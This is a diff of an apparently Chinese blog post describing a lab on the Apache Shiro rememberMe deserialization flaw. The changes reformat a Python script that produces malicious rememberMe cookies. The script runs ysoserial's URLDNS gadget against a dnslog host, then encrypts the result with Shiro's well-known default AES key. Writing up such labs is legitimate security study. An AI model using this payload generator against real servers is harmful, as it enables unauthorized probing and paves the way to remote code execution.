@@ -20,7 +20,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C&#x2F;3.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C&#x2F;4.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C&#x2F;5.png">
-<meta property="og:updated_time" content="2020-01-21T06:52:04.402Z">
+<meta property="og:updated_time" content="2020-02-10T03:06:58.234Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C&#x2F;1.png">
   
@@ -206,38 +206,72 @@
 <p>payload 构造</p>
 <p>前16字节的密钥–&gt;后面加入序列化参数–&gt;AES加密–&gt;base64编码–&gt;发送cookie。</p>
 <p>脚本内容如下</p>
-<p>import  base64</p>
-<p>import uuid</p>
-<p>import time</p>
-<p>import subprocess</p>
-<p>from Crypto.Cipher import AES</p>
-<p>dnslog = “xxxxxxxx” #自己写自己的dnslog地址</p>
-<p>keylist = {‘key1’:’kPH+bIxk5D2deZiIxcaaaA==’} #如果有新key可以在这里编辑</p>
-<p>def encode_rememberme(command,codekey):</p>
-<p>​    popen = subprocess.Popen([‘java’, ‘-jar’,  ‘ysoserial-master.jar’, ‘URLDNS’, command], stdout=subprocess.PIPE)</p>
-<p>​    BS = AES.block_size</p>
-<p>​    pad = lambda s: s + ((BS - len(s) % BS) *  chr(BS - len(s) % BS)).encode()</p>
-<p>​    key = codekey</p>
-<p>​    mode = AES.MODE_CBC</p>
-<p>​    iv  =  uuid.uuid4().bytes</p>
-<p>​    encryptor =  AES.new(base64.b64decode(key), mode, iv)</p>
-<p>​    file_body = pad(popen.stdout.read())</p>
-<p>​    base64_ciphertext = base64.b64encode(iv +  encryptor.encrypt(file_body))</p>
-<p>​    return base64_ciphertext</p>
-<p>if <strong>name</strong>  == ‘<strong>main</strong>‘:</p>
-<p>​    f = open(‘shiro_ok.txt’,’w’)</p>
-<p>​    for key,value1 in keylist.items():</p>
-<p>​        time.sleep(0.5)</p>
-<p>​        #print(key,value1)</p>
-<p>​        url = key+”.”+dnslog</p>
-<p>​        cmd = “http://%s” %(url)</p>
-<p>​        #print cmd</p>
-<p>​        payload =  encode_rememberme(command=cmd,codekey=value1)</p>
-<p>​        content = payload.decode()</p>
-<p>​        print content</p>
-<p>​        f.write(content+”\n”)</p>
-<p>​    # print(“rememberMe={}”.format(payload.decode()))</p>
-<p>​    f.close()</p>
+<ol>
+<li><p>import  base64</p>
+</li>
+<li><p>import uuid</p>
+</li>
+<li><p>import time</p>
+</li>
+<li><p>import subprocess</p>
+</li>
+<li><p>from Crypto.Cipher import AES</p>
+</li>
+<li><p>dnslog = “xxxxxxxx” #自己写自己的dnslog地址</p>
+</li>
+<li><p>keylist = {‘key1’:’kPH+bIxk5D2deZiIxcaaaA==’} #如果有新key可以在这里编辑</p>
+</li>
+<li><p>def encode_rememberme(command,codekey):</p>
+</li>
+<li><p>popen = subprocess.Popen([‘java’, ‘-jar’,  ‘ysoserial-master.jar’, ‘URLDNS’, command], stdout=subprocess.PIPE)</p>
+</li>
+<li><p>BS = AES.block_size</p>
+</li>
+<li><p>pad = lambda s: s + ((BS - len(s) % BS) *  chr(BS - len(s) % BS)).encode()</p>
+</li>
+<li><p>key = codekey</p>
+</li>
+<li><p>mode = AES.MODE_CBC</p>
+</li>
+<li><p>iv  =  uuid.uuid4().bytes</p>
+</li>
+<li><p>encryptor =  AES.new(base64.b64decode(key), mode, iv)</p>
+</li>
+<li><p>file_body = pad(popen.stdout.read())</p>
+</li>
+<li><p>base64_ciphertext = base64.b64encode(iv +  encryptor.encrypt(file_body))</p>
+</li>
+<li><p>return base64_ciphertext</p>
+</li>
+<li><p>if <strong>name</strong>  == ‘<strong>main</strong>‘:</p>
+</li>
+<li><p>​    f = open(‘shiro_ok.txt’,’w’)</p>
+</li>
+<li><p>​    for key,value1 in keylist.items():</p>
+</li>
+<li><p>​    time.sleep(0.5)</p>
+</li>
+<li><p>​    #print(key,value1)</p>
+</li>
+<li><p>​    url = key+”.”+dnslog</p>
+</li>
+<li><p>​    cmd = “http://%s” %(url)</p>
+</li>
+<li><p>​    #print cmd</p>
+</li>
+<li><p>​    payload =  encode_rememberme(command=cmd,codekey=value1)</p>
+</li>
+<li><p>​    content = payload.decode()</p>
+</li>
+<li><p>​    print content</p>
+</li>
+<li><p>​    f.write(content+”\n”)</p>
+</li>
+<li><p>​    # print(“rememberMe={}”.format(payload.decode()))</p>
+</li>
+<li><p>​    f.close()</p>
+</li>
+</ol>
 <p>生成字段如下</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C/3.png" alt="img"></p>
 <p>返回包带有 remeberMe=deleteMe字段</p>
